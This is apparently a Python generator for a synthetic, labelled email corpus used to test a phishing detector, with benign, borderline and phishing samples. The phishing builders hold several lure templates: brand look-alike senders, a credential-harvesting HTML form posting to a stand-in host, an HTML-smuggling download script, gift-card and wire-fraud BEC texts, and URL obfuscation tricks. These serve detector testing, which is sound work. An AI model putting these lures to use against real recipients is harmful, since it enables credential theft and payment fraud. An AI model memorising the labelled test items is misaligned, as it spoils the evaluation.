"""Deterministic generator for the SYNTHETIC labelled corpus (samples/), its DNS fixtures and ground_truth.json.

Nothing here is real: all organisations are fictional, sender and link domains are reserved (example.*, *.test, *.invalid; the only
exceptions are the real brand domains paypal.com, amazon.com and aws.amazon.com, used as the legitimate side of look-alike and
must-not-flag tests) and all IPs are RFC 5737 documentation addresses. Attachments are inert text stubs. Every message carries X-Synthetic-Sample: yes.
"""
from __future__ import annotations

import json
import os
import zlib
from typing import Callable, Dict, List, Optional, Tuple

from .synthbuild import (Att, ORG_DOMAIN, RCPT, build_eml, enc_word, exe_stub, make_ooxml, make_zip, pdf_clean, png_tiny, rfc_date, zipcrypto_zip)

CORPUS_VERSION = 1
NOTICE = ("SYNTHETIC CORPUS. These messages were written for this project. The organisations, people, sender domains and IP addresses are fictional "
          "or reserved for documentation (RFC 2606 / RFC 5737). The only real domains are the brand domains paypal.com, amazon.com and aws.amazon.com, "
          "used as the legitimate side of look-alike and must-not-flag tests (nothing is ever fetched). Attachments are inert text stubs with magic bytes only. "
          "Nothing here is a real threat sample.")
ENTRIES: List[dict] = []


def entry(id: str, label: str, category: str, desc: str, expect: Tuple[str, ...] = (), forbid: Tuple[str, ...] = (), set_: str = "tuning"):
    def deco(fn: Callable[[], bytes]):
        ENTRIES.append({"id": id, "file": f"{id}.eml", "label": label, "category": category, "description": desc, "expect": list(expect),
                        "forbid": list(forbid), "set": set_, "build": fn})
        return fn
    return deco


# ---------------------------------------------------------------------------------------------- header helpers
def rcv(by: str, helo: str, rdns: str, ip: str, ts: str, proto: str = "ESMTPS", rid: str = "") -> Tuple[str, str]:
    rid = rid or f"{zlib.crc32(repr((by, helo, ts)).encode()) % 10**8:08d}"
    return ("Received", f"from {helo} ({rdns} [{ip}]) by {by} with {proto} id {rid}; {ts}")


def deliver(origin_helo: str, origin_rdns: str, origin_ip: str, day: int, hh: int, mm: int, lag: int = 2, mx: str = "mx1." + ORG_DOMAIN) -> List[Tuple[str, str]]:
    """Two Received headers, newest first: edge MX receives from the origin, then hands to the internal mailbox host."""
    t1 = rfc_date(day, hh, mm, 5)
    t2 = rfc_date(day, hh, mm, 5 + lag)
    return [rcv("mbx1." + ORG_DOMAIN, mx, mx, "10.20.0.5", t2, "LMTP", "A1B2C3"), rcv(mx, origin_helo, origin_rdns, origin_ip, t1, "ESMTPS", "D4E5F6")]


def ar(spf: Optional[Tuple[str, str]] = None, dkim: Tuple[Tuple[str, str, str], ...] = (), dmarc: Optional[Tuple[str, str]] = None) -> Tuple[str, str]:
    parts = ["mx1." + ORG_DOMAIN]
    if spf:
        parts.append(f"spf={spf[0]} smtp.mailfrom={spf[1]}")
    for res, d, s in dkim:
        parts.append(f"dkim={res} header.d={d} header.s={s}")
    if dmarc:
        parts.append(f"dmarc={dmarc[0]} header.from={dmarc[1]}")
    return ("Authentication-Results", "; ".join(parts))


def hdr(frm: str, subject: str, day: int, hh: int, mm: int, msgid: Optional[str], to: str = RCPT, rp: Optional[str] = None, rt: Optional[str] = None,
        recv: Optional[List[Tuple[str, str]]] = None, auth: Optional[Tuple[str, str]] = None, extra: Tuple[Tuple[str, str], ...] = (), tz: str = "+0000") -> List[Tuple[str, str]]:
    h: List[Tuple[str, str]] = []
    if rp is not None:
        h.append(("Return-Path", f"<{rp}>"))
    h += (recv or [])
    if auth:
        h.append(auth)
    h += [("X-Synthetic-Sample", "yes"), ("From", frm), ("To", to)]
    if rt:
        h.append(("Reply-To", rt))
    h.append(("Subject", enc_word(subject)))
    h.append(("Date", rfc_date(day, hh, mm, 0, tz)))
    if msgid:
        h.append(("Message-ID", msgid))
    h += list(extra)
    return h


def page(title: str, body_html: str) -> str:
    return f"<html><body style=\"font-family:Arial\"><h2>{title}</h2>{body_html}<p style=\"color:#888;font-size:11px\">Synthetic sample for testing.</p></body></html>"


# ================================================================================================ BENIGN / must-not-flag
@entry("B01-newsletter-harbour-gazette", "benign", "newsletter", "Marketing newsletter through an ESP: Return-Path and tracking links on the ESP domain, DKIM aligned.", forbid=("url_redirect_param", "url_text_mismatch"))
def _b01():
    h = hdr('"Harbour Gazette" <newsletter@harbourgazette.example>', "This week: harbour dredging, new ferry timetable", 3, 9, 14, "<20260303.0914.4411@harbourgazette.example>",
            rp="bounce+4411@esp-mail.example", recv=deliver("out7.esp-mail.example", "out7.esp-mail.example", "198.51.100.23", 3, 9, 14),
            auth=ar(("pass", "bounce+4411@esp-mail.example"), (("pass", "harbourgazette.example", "s2026"),), ("pass", "harbourgazette.example")),
            extra=(("List-Id", "<weekly.harbourgazette.example>"), ("List-Unsubscribe", "<https://click.esp-mail.example/unsub/4411>"), ("Precedence", "bulk")))
    txt = "Harbour Gazette - weekly digest\n\nRead the ferry timetable: https://click.esp-mail.example/c?u=https%3A%2F%2Fharbourgazette.example%2Fferry&id=4411\nOffer ends today: 10% off annual subscriptions.\nUnsubscribe: https://click.esp-mail.example/unsub/4411\n"
    html = page("Harbour Gazette - weekly digest", '<p><a href="https://click.esp-mail.example/c?u=https%3A%2F%2Fharbourgazette.example%2Fferry&amp;id=4411">Read the ferry timetable</a></p><p>Offer ends today: 10% off annual subscriptions.</p><p><a href="https://click.esp-mail.example/unsub/4411">Unsubscribe</a></p>')
    return build_eml(h, txt, html)


@entry("B02-internal-finance-approvals", "benign", "internal", "Internal mail from the real CFO address (a protected name) about invoice approvals: protected name on the real domain must not trigger spoofing.", forbid=("display_name_exec_spoof", "combo_exec_payment"))
def _b02():
    h = hdr('"Marcus Cole" <marcus.cole@' + ORG_DOMAIN + '>', "Q3 invoice approvals - sign-off needed Friday", 5, 14, 2, "<CAF3a91b@mail." + ORG_DOMAIN + ">",
            rp="marcus.cole@" + ORG_DOMAIN, recv=deliver("laptop-mc.corp." + ORG_DOMAIN, "laptop-mc.corp." + ORG_DOMAIN, "10.20.4.18", 5, 14, 2),
            auth=ar(("pass", ORG_DOMAIN), (("pass", ORG_DOMAIN, "sel1"),), ("pass", ORG_DOMAIN)))
    return build_eml(h, "Hi Alex,\n\nPlease review the Q3 invoice batch in the finance share and sign off by Friday.\nThe payment run is on Monday.\n\nMarcus\n")


@entry("B03-hr-benefits-deadline", "benign", "internal", "Urgent-sounding HR deadline notice, same-domain link, authenticated: urgency alone must stay below the threshold.", forbid=("url_lookalike_domain", "display_name_exec_spoof"))
def _b03():
    h = hdr('"Human Resources" <hr@' + ORG_DOMAIN + '>', "URGENT: benefits enrolment closes in 3 days - action required", 9, 8, 30, "<hr-20260309-01@" + ORG_DOMAIN + ">",
            rp="hr@" + ORG_DOMAIN, recv=deliver("mail-hr." + ORG_DOMAIN, "mail-hr." + ORG_DOMAIN, "10.20.1.9", 9, 8, 30),
            auth=ar(("pass", ORG_DOMAIN), (("pass", ORG_DOMAIN, "sel1"),), ("pass", ORG_DOMAIN)))
    url = "https://hr." + ORG_DOMAIN + "/enrol"
    return build_eml(h, f"Hello team,\n\nBenefits enrolment closes within 3 days. Action required: choose your plan at {url}\n\nHuman Resources\n",
                     page("Benefits enrolment", f'<p>Enrolment closes within 3 days. Action required.</p><p><a href="{url}">Choose your plan</a></p>'))


@entry("B04-saas-password-reset", "benign", "legit password reset", "A genuine, user-requested password reset from a SaaS vendor: credential wording and a link to the sender's own domain.", forbid=("url_login_keywords", "url_text_mismatch"))
def _b04():
    h = hdr('"Cloudnote Support" <no-reply@cloudnote.example>', "Reset your Cloudnote password", 11, 16, 45, "<rst.88213@cloudnote.example>", rp="no-reply@cloudnote.example",
            recv=deliver("smtp3.cloudnote.example", "smtp3.cloudnote.example", "203.0.113.41", 11, 16, 45),
            auth=ar(("pass", "cloudnote.example"), (("pass", "cloudnote.example", "k1"),), ("pass", "cloudnote.example")))
    url = "https://app.cloudnote.example/account/reset?token=Zk3pV9aQ"
    return build_eml(h, f"You asked to reset your password. Use the link below within 1 hour:\n{url}\n\nIf you did not ask for this, ignore this message.\n",
                     page("Password reset", f'<p>You asked to reset your password. The link works for 1 hour.</p><p><a href="{url}">Reset password</a></p>'))


@entry("B05-shop-order-receipt", "benign", "receipt", "Order confirmation with a clean PDF invoice attached.", forbid=("attachment_magic_mismatch", "attachment_executable"))
def _b05():
    h = hdr('"Lantern Books" <orders@lanternbooks.example>', "Your order #LB-20931 - receipt attached", 12, 11, 3, "<order.20931@lanternbooks.example>", rp="orders@lanternbooks.example",
            recv=deliver("mailer.lanternbooks.example", "mailer.lanternbooks.example", "192.0.2.61", 12, 11, 3),
            auth=ar(("pass", "lanternbooks.example"), (("pass", "lanternbooks.example", "m1"),), ("pass", "lanternbooks.example")))
    return build_eml(h, "Thanks for your order. Invoice attached (PDF).\nTrack it at https://www.lanternbooks.example/orders/20931\n", None,
                     [Att("Invoice-LB-20931.pdf", pdf_clean("receipt"), "application/pdf")])


@entry("B06-monitoring-alert-no-msgid", "benign", "legit but weird", "Automated monitoring alert with no Message-ID header (some scripts omit it); everything else is clean.", expect=("message_id_missing",))
def _b06():
    h = hdr('"Monitor" <alerts@monitor.example.net>', "[ALERT] disk usage 91% on db-02", 14, 3, 17, None, rp="alerts@monitor.example.net",
            recv=deliver("monitor.example.net", "monitor.example.net", "198.51.100.88", 14, 3, 17),
            auth=ar(("pass", "monitor.example.net"), (("pass", "monitor.example.net", "mon"),), ("pass", "monitor.example.net")))
    return build_eml(h, "Host db-02 /var is at 91% (threshold 90%). See https://monitor.example.net/hosts/db-02\n")


@entry("B07-events-idn-muenchen", "benign", "legit IDN", "Legitimate internationalised domain (single-script Latin with umlaut, punycode on the wire): must not be reported as a homograph.", forbid=("url_idn_homograph", "url_text_mismatch", "url_lookalike_domain"))
def _b07():
    dom = "m\u00fcnchen.example".encode("idna").decode()
    h = hdr(f'"{enc_word("Münchner Konzerte")}" <tickets@{dom}>', "Your concert tickets", 16, 18, 22, f"<t.7712@{dom}>", rp=f"tickets@{dom}",
            recv=deliver(f"mail.{dom}", f"mail.{dom}", "203.0.113.77", 16, 18, 22), auth=ar(("pass", dom), (("pass", dom, "d1"),), ("pass", dom)))
    return build_eml(h, f"Your tickets: https://{dom}/tickets/7712\n", page("Tickets", f'<p><a href="https://{dom}/tickets/7712">https://m\u00fcnchen.example/tickets/7712</a></p>'))


@entry("B08-event-ticket-qr", "benign", "legit QR", "Event ticket with a QR image and 'scan this code at the door' wording. QR wording is weak evidence on its own.", expect=("qr_lure",))
def _b08():
    h = hdr('"Riverside Events" <tickets@riverside-events.example>', "Your ticket for Saturday", 18, 12, 40, "<tk.5521@riverside-events.example>", rp="tickets@riverside-events.example",
            recv=deliver("mail.riverside-events.example", "mail.riverside-events.example", "192.0.2.90", 18, 12, 40),
            auth=ar(("pass", "riverside-events.example"), (("pass", "riverside-events.example", "r1"),), ("pass", "riverside-events.example")))
    return build_eml(h, "Scan the QR code at the door. Gates open at 18:00.\n", page("Your ticket", '<p>Scan the QR code at the door.</p><img src="cid:ticketqr" alt="ticket QR">'),
                     [Att("ticket-qr.png", png_tiny(), "image/png", inline_cid="ticketqr")])


@entry("B09-courier-parcel-shortlink", "benign", "legit shortener", "Courier tracking mail using a URL shortener (stand-in short.test): shortener alone is a minor signal.", expect=("url_shortener",))
def _b09():
    h = hdr('"Swift Couriers" <tracking@swiftcouriers.example>', "Your parcel arrives today", 20, 7, 55, "<trk.99120@swiftcouriers.example>", rp="tracking@swiftcouriers.example",
            recv=deliver("relay.swiftcouriers.example", "relay.swiftcouriers.example", "198.51.100.140", 20, 7, 55),
            auth=ar(("pass", "swiftcouriers.example"), (("pass", "swiftcouriers.example", "s1"),), ("pass", "swiftcouriers.example")))
    return build_eml(h, "Your parcel will arrive by 5pm. Track: https://short.test/Ab12Cd\n")


@entry("B10-mailing-list-digest", "benign", "legit but weird", "Mailing-list post: Reply-To, Return-Path and Message-ID all belong to the list, not the author's domain.", forbid=("reply_to_mismatch", "return_path_mismatch", "message_id_domain_mismatch"))
def _b10():
    h = hdr('"Bob Fisher" <bob@example.org>', "[nettalk] re: switch firmware 4.2 rollout", 21, 10, 5, "<list.31772@lists.example.net>", rt="nettalk@lists.example.net",
            rp="nettalk-bounces@lists.example.net", recv=deliver("lists.example.net", "lists.example.net", "203.0.113.120", 21, 10, 5),
            auth=ar(("pass", "nettalk-bounces@lists.example.net"), (("pass", "example.org", "k2"),), ("pass", "example.org")),
            extra=(("List-Id", "<nettalk.lists.example.net>"), ("List-Unsubscribe", "<mailto:nettalk-leave@lists.example.net>")))
    return build_eml(h, "We rolled 4.2 to the lab racks last night, no regressions so far.\n-- \nnettalk mailing list\n")


@entry("B12-secops-awareness-quoted-phish", "benign", "known hard negative", "Internal security-awareness mail that QUOTES a defanged phishing URL as a teaching example. A static scanner cannot know it is quoted, so it over-scores this message; kept as an honest failure case.")
def _b12():
    h = hdr('"Security Team" <secops@' + ORG_DOMAIN + '>', "Awareness: spot this week's fake PayPal email", 23, 13, 0, "<sec.20260323@" + ORG_DOMAIN + ">", rp="secops@" + ORG_DOMAIN,
            recv=deliver("mail-sec." + ORG_DOMAIN, "mail-sec." + ORG_DOMAIN, "10.20.2.7", 23, 13, 0), auth=ar(("pass", ORG_DOMAIN), (("pass", ORG_DOMAIN, "sel1"),), ("pass", ORG_DOMAIN)))
    return build_eml(h, "Team,\n\nThis week's example (defanged, do NOT visit): hxxps://paypa1-secure[.]test/login\nIt says \"verify your account\" and threatens suspension. Report anything like it to the help desk.\n\nSecurity Team\n")


# ================================================================================================ SUSPICIOUS (borderline)
@entry("S01-partner-encrypted-zip", "suspicious", "borderline", "Authenticated partner mail with a password-protected ZIP and the password in the body. Legitimate in practice, but exactly how malware evades gateways.", expect=("archive_encrypted", "archive_password_hint"))
def _s01():
    h = hdr('"Eastgate Logistics" <ops@eastgate-logistics.example>', "Shipping documents for PO 4471", 24, 9, 12, "<po4471.1@eastgate-logistics.example>", rp="ops@eastgate-logistics.example",
            recv=deliver("mx.eastgate-logistics.example", "mx.eastgate-logistics.example", "192.0.2.150", 24, 9, 12),
            auth=ar(("pass", "eastgate-logistics.example"), (("pass", "eastgate-logistics.example", "e1"),), ("pass", "eastgate-logistics.example")))
    z = zipcrypto_zip([("PO-4471-docs.docx", make_ooxml("word", False)), ("packing-list.xlsx", make_ooxml("xl", False))], "Ship4471!")
    return build_eml(h, "Hello,\n\nShipping documents attached. Password: Ship4471!\n\nRegards, Eastgate Logistics\n", None, [Att("PO-4471-docs.zip", z, "application/zip")])


@entry("S02-shared-doc-unauth-shortlink", "suspicious", "borderline", "Unauthenticated 'shared document' notice from an unknown sender, shortened link and sign-in wording.", expect=("url_shortener", "credential_lure"))
def _s02():
    h = hdr('"Sam Whitlock" <sam.whitlock@example.net>', "Sam shared a document with you", 25, 15, 33, "<share.6631@example.net>", rp="sam.whitlock@example.net",
            recv=deliver("smtp.example.net", "smtp.example.net", "198.51.100.200", 25, 15, 33))
    return build_eml(h, "Sam shared 'Budget-2026' with you.\nSign in to view: https://short.test/Qx81Lm\n")


@entry("S03-unknown-vendor-invoice-reply-to", "suspicious", "borderline", "Invoice notice from an unknown vendor whose Reply-To goes elsewhere; no authentication results.", expect=("reply_to_mismatch", "payment_lure"))
def _s03():
    h = hdr('"Accounts Receivable" <billing@brightpath-supplies.example>', "Invoice 55120 overdue", 26, 10, 48, "<inv.55120@brightpath-supplies.example>", rp="billing@brightpath-supplies.example",
            rt="collections@quickpay-desk.example", recv=deliver("mail.brightpath-supplies.example", "mail.brightpath-supplies.example", "192.0.2.201", 26, 10, 48))
    return build_eml(h, "Our records show invoice 55120 is overdue. Please remit payment this week. Questions: reply to this email.\n")


# ================================================================================================ PHISHING / MALICIOUS
@entry("P01-paypal-lookalike-credential", "phishing", "credential phish", "Classic brand phish: look-alike sender domain (paypa1), brand display name, text/href mismatch, failing SPF/DMARC.",
       expect=("sender_domain_lookalike", "display_name_brand_spoof", "url_text_mismatch", "url_brand_in_domain", "dmarc_fail"))
def _p01():
    h = hdr('"PayPal Security" <service@paypa1-secure.test>', "Action required: unusual sign-in detected", 4, 2, 11, "<9f2c1@bulk7.paypa1-secure.test>", rp="bounce@paypa1-secure.test",
            recv=deliver("bulk7.paypa1-secure.test", "unknown", "203.0.113.200", 4, 2, 11), auth=ar(("fail", "bounce@paypa1-secure.test"), (), ("fail", "paypa1-secure.test")))
    url = "https://paypa1-secure.test/signin?id=88213"
    return build_eml(h, f"We noticed an unusual sign-in. Verify your account within 24 hours or it will be suspended.\n{url}\n",
                     page("PayPal", f'<p>We noticed an unusual sign-in. Verify your account within 24 hours or it will be suspended.</p><p><a href="{url}">https://www.paypal.com/verify</a></p>'))


@entry("P02-microsoft-idn-homograph", "phishing", "homograph", "Link to an internationalised domain that swaps Latin letters for Cyrillic lookalikes (xn--...), mailbox-full lure.",
       expect=("url_idn_homograph", "credential_lure"))
def _p02():
    dom = "micr\u043es\u043eft.invalid".encode("idna").decode()
    h = hdr('"Microsoft 365 Admin" <admin@m365-notices.test>', "Your mailbox is full - verify your account", 6, 22, 9, "<a8812@m365-notices.test>", rp="admin@m365-notices.test",
            recv=deliver("m365-notices.test", "m365-notices.test", "198.51.100.211", 6, 22, 9), auth=ar(("softfail", "m365-notices.test"), (), ("fail", "m365-notices.test")))
    url = f"https://{dom}/owa/verify"
    return build_eml(h, f"Your mailbox is over quota. Verify your account now: {url}\n", page("Mailbox", f'<p>Your mailbox is over quota.</p><p><a href="{url}">Verify your account</a></p>'))


@entry("P03-docusign-html-credential-attachment", "phishing", "malicious attachment", "'Signed document' HTML attachment that is really a credential-harvesting form posting to an external host.",
       expect=("html_attachment", "html_credential_form", "display_name_brand_spoof", "sender_domain_lookalike"))
def _p03():
    h = hdr('"DocuSign" <dse@docusgn-mail.test>', "Completed: please review and sign", 7, 12, 30, "<ds.5589@docusgn-mail.test>", rp="dse@docusgn-mail.test",
            recv=deliver("docusgn-mail.test", "docusgn-mail.test", "203.0.113.213", 7, 12, 30), auth=ar(("fail", "docusgn-mail.test"), (), ("fail", "docusgn-mail.test")))
    form = page("Sign in to view document", '<form method="post" action="https://collect.docusgn-mail.test/post"><input name="email"><input type="password" name="pw"><button>View</button></form>')
    return build_eml(h, "Your document is attached. Open it in your browser and sign in to view.\n", None, [Att("Agreement-7589.html", form.encode(), "text/html")])


@entry("P04-remittance-html-smuggling", "phishing", "malicious attachment", "HTML attachment that assembles a download in the browser (Blob + atob + click): HTML smuggling.",
       expect=("html_attachment", "html_smuggling"))
def _p04():
    h = hdr('"Accounts" <remit@gl-payments.test>', "Remittance advice - open attachment", 8, 5, 41, "<rm.0041@gl-payments.test>", rp="remit@gl-payments.test",
            recv=deliver("gl-payments.test", "gl-payments.test", "198.51.100.230", 8, 5, 41), auth=ar(("fail", "gl-payments.test"), (), ("fail", "gl-payments.test")))
    import base64
    blob = base64.b64encode(b"SYNTHETIC INERT PAYLOAD - NOT A PROGRAM. " * 12).decode()
    js = (f"<html><body><script>var d=atob('{blob}');var a=new Uint8Array(d.length);for(var i=0;i<d.length;i++)a[i]=d.charCodeAt(i);"
          "var b=new Blob([a],{type:'application/octet-stream'});var u=URL.createObjectURL(b);var l=document.createElement('a');l.href=u;l.download='remittance.iso';document.body.appendChild(l);l.click();</script></body></html>")
    return build_eml(h, "Please find the remittance advice attached. Open in your browser.\n", None, [Att("Remittance-0041.html", js.encode(), "text/html")])


@entry("P05-invoice-double-extension-exe", "phishing", "malicious attachment", "Executable disguised as a PDF with a double extension; magic bytes say MZ.",
       expect=("attachment_double_extension", "attachment_executable", "attachment_known_bad", "spf_fail"))
def _p05():
    h = hdr('"Billing Dept" <billing@vendor-pay.example>', "Invoice 8841", 9, 8, 2, "<b8841@vendor-pay.example>", rp="billing@vendor-pay.example",
            recv=deliver("mail.vendor-pay.example", "mail.vendor-pay.example", "198.51.100.77", 9, 8, 2))
    return build_eml(h, "Invoice attached, please process today.\n", None, [Att("Invoice_8841.pdf.exe", exe_stub("P05"), "application/octet-stream")])


@entry("P06-purchase-order-macro-docm", "phishing", "malicious attachment", "Macro-enabled Word document (.docm containing vbaProject.bin) sent as a purchase order.",
       expect=("attachment_macro", "enable_content_lure"))
def _p06():
    h = hdr('"Procurement" <po@tradelink-co.test>', "Purchase order PO-2291 - enable content", 10, 13, 20, "<po2291@tradelink-co.test>", rp="po@tradelink-co.test",
            recv=deliver("tradelink-co.test", "tradelink-co.test", "203.0.113.222", 10, 13, 20), auth=ar(("none", "tradelink-co.test"), (), ("none", "tradelink-co.test")))
    return build_eml(h, "Please see the attached purchase order. Click Enable Content to view the pricing table. Payment pending your confirmation.\n", None,
                     [Att("PO-2291.docm", make_ooxml("word", True), "application/vnd.ms-word.document.macroEnabled.12")])


@entry("P07-scans-zip-with-scr", "phishing", "malicious attachment", "Unencrypted ZIP whose only real content is a .pdf.scr screensaver executable.",
       expect=("archive_contains_executable",))
def _p07():
    h = hdr('"Scanner" <scanner@officecopy.test>', "Scanned documents", 11, 9, 59, "<sc.2201@officecopy.test>", rp="scanner@officecopy.test",
            recv=deliver("officecopy.test", "officecopy.test", "192.0.2.222", 11, 9, 59), auth=ar(("softfail", "officecopy.test"), (), ("fail", "officecopy.test")))
    z = make_zip([("scan_0412.pdf.scr", exe_stub("P07")), ("readme.txt", b"Synthetic readme")])
    return build_eml(h, "Documents scanned from the office copier are attached.\n", None, [Att("scan_0412.zip", z, "application/zip")])


@entry("P08-encrypted-zip-exe-password", "phishing", "malicious attachment", "Password-protected ZIP holding an executable, password given in the message body to dodge scanners.",
       expect=("archive_encrypted", "archive_password_hint"))
def _p08():
    h = hdr('"Legal Notice" <notices@court-docs.test>', "Subpoena documents - password inside", 12, 6, 14, "<lg.7311@court-docs.test>", rp="notices@court-docs.test",
            recv=deliver("court-docs.test", "court-docs.test", "203.0.113.231", 12, 6, 14), auth=ar(("fail", "court-docs.test"), (), ("fail", "court-docs.test")))
    z = zipcrypto_zip([("subpoena_details.exe", exe_stub("P08"))], "4471")
    return build_eml(h, "You must review the attached documents immediately.\nThe archive password is: 4471\n", None, [Att("subpoena.zip", z, "application/zip")])


@entry("P09-ceo-gift-card-bec", "phishing", "BEC", "CEO impersonation from a free-mail address asking staff to buy gift cards and keep it quiet.",
       expect=("display_name_exec_spoof", "freemail_display_spoof", "gift_card_scam", "bec_wording"))
def _p09():
    h = hdr('"Priya Raman (CEO)" <priya.raman.ceo@freemail.example>', "Quick favour", 13, 17, 5, "<q7721@freemail.example>", rp="priya.raman.ceo@freemail.example",
            recv=deliver("mail-oa1.freemail.example", "mail-oa1.freemail.example", "198.51.100.12", 13, 17, 5), auth=ar(("pass", "freemail.example"), (("pass", "freemail.example", "f1"),), ("pass", "freemail.example")))
    return build_eml(h, "Are you available? I need a quick favor and I'm in a meeting so cannot take calls.\nPlease buy 5 gift cards (Amazon, $200 each), scratch off the back and send me the codes. Keep this confidential. I will reimburse you.\n\nPriya\n")


@entry("P10-cfo-vendor-bank-change-lookalike", "phishing", "BEC", "CFO impersonation from a one-letter-off look-alike of the company domain, urgent wire to 'new bank details', SPF fails in the offline evaluator, and a Received chain whose timestamps go backwards.",
       expect=("sender_domain_lookalike", "display_name_exec_spoof", "bec_wording", "spf_fail", "received_time_anomaly", "received_helo_mismatch"))
def _p10():
    dom = "northwind-analytlcs.example"
    h = hdr(f'"Marcus Cole" <marcus.cole@{dom}>', "Urgent wire transfer - new bank details", 14, 19, 37, f"<w88@{dom}>", rp=f"marcus.cole@{dom}", rt="m.cole.finance@freemail.example",
            recv=[rcv("mbx1." + ORG_DOMAIN, "mx1." + ORG_DOMAIN, "mx1." + ORG_DOMAIN, "10.20.0.5", rfc_date(14, 19, 37, 7), "LMTP", "A1B2C3"),
                  rcv("mx1." + ORG_DOMAIN, "relay2.mailhop.test", "relay2.mailhop.test", "203.0.113.9", rfc_date(14, 19, 37, 5), "ESMTPS", "D4E5F6"),
                  rcv("relay2.mailhop.test", f"mail.{dom}", "unknown", "198.51.100.99", rfc_date(14, 20, 5, 11), "SMTP", "G7H8I9")])
    return build_eml(h, "Alex,\n\nWe need to process a wire payment today before close of business. The vendor has new bank details (attached in the next mail). Do not call me, I am travelling; reply to this email only.\n\nMarcus\n")


@entry("P11-helpdesk-password-reset-spoof", "phishing", "credential phish", "Spoofed IT Help Desk: password-expiry scare with a link to a domain that embeds the company name.",
       expect=("display_name_exec_spoof", "url_brand_in_domain", "credential_lure", "urgency_language"))
def _p11():
    h = hdr('"IT Help Desk" <helpdesk@northwind-analytics-support.test>', "Password expires in 24 hours - keep your current password", 15, 7, 50, "<hd.4412@northwind-analytics-support.test>",
            rp="helpdesk@northwind-analytics-support.test", recv=deliver("northwind-analytics-support.test", "northwind-analytics-support.test", "203.0.113.240", 15, 7, 50),
            auth=ar(("none", "northwind-analytics-support.test"), (), ("none", "northwind-analytics-support.test")))
    url = "https://sso.northwind-analytics-support.test/login?user=alex.morgan"
    return build_eml(h, f"Your password will expire within 24 hours. Sign in to keep your current password: {url}\n\nIT Help Desk\n",
                     page("Password expiry", f'<p>Your password will expire within 24 hours.</p><p><a href="{url}">Keep my current password</a></p>'))


@entry("P12-mfa-qr-code-phish", "phishing", "QR phish", "'Re-authenticate MFA' lure delivered as a QR image with no clickable link, from a spoofed brand name.",
       expect=("qr_lure", "display_name_brand_spoof", "credential_lure"))
def _p12():
    h = hdr('"Microsoft Security" <no-reply@secure-notify.test>', "Action required: re-validate your account with MFA", 16, 4, 18, "<mfa.201@secure-notify.test>", rp="no-reply@secure-notify.test",
            recv=deliver("secure-notify.test", "secure-notify.test", "198.51.100.188", 16, 4, 18), auth=ar(("fail", "secure-notify.test"), (), ("fail", "secure-notify.test")))
    return build_eml(h, "Action required: validate your account within 24 hours. Scan the QR code below with your phone to complete multi-factor setup.\n",
                     page("Security check", '<p>Action required. Scan the QR code with your phone to re-validate your account.</p><img src="cid:qr1" alt="QR">'), [Att("qr.png", png_tiny(), "image/png", inline_cid="qr1")])


@entry("P13-amazon-userinfo-ip-url", "phishing", "URL trick", "Order-problem lure whose link uses the '@' userinfo trick and an obfuscated (hex) IP address as the real host.",
       expect=("url_userinfo", "url_ip_host", "url_obfuscated", "url_text_mismatch"))
def _p13():
    h = hdr('"Amazon Orders" <orders@amaz0n-delivery.test>', "Problem with your order", 17, 11, 11, "<am.1771@amaz0n-delivery.test>", rp="orders@amaz0n-delivery.test",
            recv=deliver("amaz0n-delivery.test", "amaz0n-delivery.test", "203.0.113.19", 17, 11, 11), auth=ar(("fail", "amaz0n-delivery.test"), (), ("fail", "amaz0n-delivery.test")))
    url = "http://www.amazon.com@0xCB007150/orders/fix"
    return build_eml(h, f"There is a problem with your payment. Update your payment details: {url}\n",
                     page("Order problem", f'<p>There is a problem with your payment.</p><p><a href="{url}">https://www.amazon.com/orders</a></p>'))


@entry("P14-netflix-open-redirect-billing", "phishing", "credential phish", "Billing-failure lure whose link bounces through an open-redirect style parameter to a look-alike login host.",
       expect=("url_redirect_param", "display_name_brand_spoof", "payment_lure"))
def _p14():
    h = hdr('"Netflix Billing" <billing@nf-account-help.test>', "Payment failed - update your payment details", 18, 20, 3, "<nf.990@nf-account-help.test>", rp="billing@nf-account-help.test",
            recv=deliver("nf-account-help.test", "nf-account-help.test", "198.51.100.120", 18, 20, 3), auth=ar(("fail", "nf-account-help.test"), (), ("fail", "nf-account-help.test")))
    url = "https://trusted-news.example/out?redirect=https%3A%2F%2Fnetf1ix-billing.test%2Flogin"
    return build_eml(h, f"Your payment failed. Update your payment details to avoid suspension: {url}\n", page("Billing", f'<p>Your payment failed.</p><p><a href="{url}">Update payment details</a></p>'))


# ================================================================================================ HOLDOUT
# Written AFTER the indicator weights were frozen (see README, "Evaluation"). Not used for tuning.
@entry("H01-saas-billing-receipt-esp", "benign", "receipt", "SaaS invoice mail through an ESP: tracking links, invoice wording, DKIM aligned, SPF aligned only to the ESP.", forbid=("url_text_mismatch", "url_login_keywords"), set_="holdout")
def _h01():
    h = hdr('"Brightline Billing" <billing@brightline.example>', "Your Brightline invoice for March is ready", 27, 6, 0, "<inv.771@brightline.example>", rp="bounce-771@brightline-mail.example",
            recv=deliver("o12.brightline-mail.example", "o12.brightline-mail.example", "198.51.100.45", 27, 6, 0),
            auth=ar(("pass", "bounce-771@brightline-mail.example"), (("pass", "brightline.example", "bl1"),), ("pass", "brightline.example")),
            extra=(("List-Unsubscribe", "<https://links.brightline-mail.example/u/771>"),))
    html = page("Invoice ready", '<p>Invoice attached to your account is due in 14 days.</p><p><a href="https://links.brightline-mail.example/c/771">View invoice</a></p><p>Manage billing: <a href="https://app.brightline.example/billing/invoices/771">https://app.brightline.example/billing/invoices/771</a></p>')
    return build_eml(h, "Your March invoice is ready: https://links.brightline-mail.example/c/771\nInvoice due in 14 days.\n", html)


@entry("H02-newsletter-unicode-cafe", "benign", "legit IDN", "Newsletter with Greek and accented text and a legitimate accented-Latin domain (caf\u00e9.example); generic greeting only.", forbid=("url_idn_homograph", "url_lookalike_domain"), set_="holdout")
def _h02():
    dom = "caf\u00e9-du-nord.example".encode("idna").decode()
    h = hdr(f'"{enc_word("Café du Nord")}" <hello@{dom}>', "Menu \u03b3\u03b9\u03b1 \u03c4\u03b7\u03bd \u03b5\u03b2\u03b4\u03bf\u03bc\u03ac\u03b4\u03b1 - weekly specials", 28, 8, 20, f"<n.88@{dom}>", rp=f"hello@{dom}",
            recv=deliver(f"mail.{dom}", f"mail.{dom}", "203.0.113.150", 28, 8, 20), auth=ar(("pass", dom), (("pass", dom, "c1"),), ("pass", dom)), extra=(("List-Unsubscribe", f"<https://{dom}/unsub>"),))
    return build_eml(h, f"Dear customer,\n\nThis week: \u03bc\u03bf\u03c5\u03c3\u03b1\u03ba\u03ac\u03c2 and cr\u00e8me br\u00fbl\u00e9e. Book: https://{dom}/book\n")


